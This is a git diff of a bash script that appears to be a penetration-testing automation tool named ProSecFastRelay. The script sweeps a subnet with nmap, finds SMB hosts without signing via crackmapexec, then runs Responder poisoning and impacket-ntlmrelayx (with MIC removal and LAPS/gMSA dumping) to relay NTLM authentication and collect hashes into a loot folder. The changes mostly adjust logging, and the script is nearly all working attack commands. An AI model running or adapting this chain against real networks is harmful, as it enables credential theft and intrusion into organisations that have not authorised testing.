@@ -1,13 +1,14 @@
 #!/bin/bash
 
-echo '  _____           _____           ______        _   _____      _             '
-echo ' |  __ \         / ____|         |  ____|      | | |  __ \    | |            '
-echo ' | |__) | __ ___| (___   ___  ___| |__ __ _ ___| |_| |__) |___| | __ _ _   _ '
-echo ' |  ___/ |__/ _ \\___ \ / _ \/ __|  __/ _` / __| __|  _  // _ \ |/ _` | | | |'
-echo ' | |   | | | (_) |___) |  __/ (__| | | (_| \__ \ |_| | \ \  __/ | (_| | |_| |'
-echo ' |_|   |_|  \___/_____/ \___|\___|_|  \__,_|___/\__|_|  \_\___|_|\__,_|\__, |'
-echo '                                                                        __/ |'
-echo '                                                                       |___/ '
+echo ''
+echo "  _____           _____           ______        _   _____      _             "
+echo " |  __ \         / ____|         |  ____|      | | |  __ \    | |            "
+echo " | |__) | __ ___| (___   ___  ___| |__ __ _ ___| |_| |__) |___| | __ _ _   _ "
+echo " |  ___/ '__/ _ \\\\\___ \ / _ \/ __|  __/ _\` / __| __|  _  // _ \ |/ _\` | | | |"
+echo " | |   | | | (_) |___) |  __/ (__| | | (_| \__ \ |_| | \ \  __/ | (_| | |_| |"
+echo " |_|   |_|  \___/_____/ \___|\___|_|  \__,_|___/\__|_|  \_\___|_|\__,_|\__, |"
+echo "                                                                        __/ |"
+echo "                                                                       |___/ "
 echo ''
 
 IP=$(ip addr show eth0 | grep "inet " | cut -d '/' -f1 | cut -d ' ' -f6)
@@ -32,39 +33,39 @@ fi
 
 #NMAP PE SCAN
 if [ -s /root/output/list/ipup.txt ]; then
-echo '! > nmap PE already done'
+	echo '! > nmap PE already done'
 else
-   echo '! > NMAP PE Scan    FAST'
+   #echo '! > NMAP PE Scan    FAST'
    nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/input/ipint.txt > /dev/null 2>&1
-   echo ''
-   echo '! >> Done'
+   #echo ''
+   #echo '! >> Done'
 
    #Piping the IP-Addresses of the Targets to a file
    awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap > /root/output/list/ipup.txt
-   echo ''
+   #echo ''
 fi
 
 if [ -s /root/output/list/smb_open.txt ]; then
    echo '! > SMB Open File already exists, CME is next!'
 else
    #NMAP Portscan for port 445
-   echo '! > NMAP Portscan 445'
+   #echo '! > NMAP Portscan 445'
    nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt > /dev/null 2>&1
-   echo ''
-   echo '! >> Done'
+   #echo ''
+   #echo '! >> Done'
 
    #Piping IP's with 445 open to a file
    awk '/open/ {print$2}' /root/output/nmap/445.gnmap > /root/output/list/smb_open.txt
-   echo ''
+   #echo ''
 fi
 
 if [ -s /root/output/list/smb_sign_off.txt ]; then
    echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
 else
    #Using Crackmap to Check which of the IP's with 445 open have Signing:false
-   echo '! > Generating Relay List'
-   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt > /root/output/cme_beauty.txt
-   echo '! >> Done'
+   #echo '! > Generating Relay List'
+   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt >> /root/output/cme_beauty.txt
+   #echo '! >> Done'
 fi
 
 #When Clients with Signing:false exist
@@ -73,19 +74,19 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 	echo ''
 	
 	#Responder with 300sec timeout in bg
-	echo '! > Starting Responder'
-	timeout 300 responder -I eth0 -rdwv > /dev/null 2>&1 &
-	echo ''
-	echo '! >> Done'
-	echo ''
+	echo '! > Starting Responder && impacket-ntlmrelayx'
+	timeout 300 responder -I eth0 -rdwv >> /root/output/responder.txt &
+	#echo ''
+	#echo '! >> Done'
+	#echo ''
 
 	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
-	echo '! > Starting NTLM-Relay'
-	timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
-	echo ''
+	#echo '! > Starting NTLM-Relay'
+	timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
+	#echo ''
 
 	#Declaring variables for each PID of Responder and NTLMRelayX
-	echo '! >> Waiting for Hashes'
+	#echo '! >> Waiting for Hashes'
 
 	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
 	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
@@ -95,12 +96,10 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 	wait $PID_RELAY
 	
 	#When Output-File exists and is not empty
-	if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]
-		then
+	if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
 		#Show me 'dem Hashes
-		cat /root/output/loot/ntlm_relay_ntlmv2.txt
-
-		else
+		echo '! > Got Hashes!'
+	else
 		echo '! >> No Hashes Found'
 	fi
 else
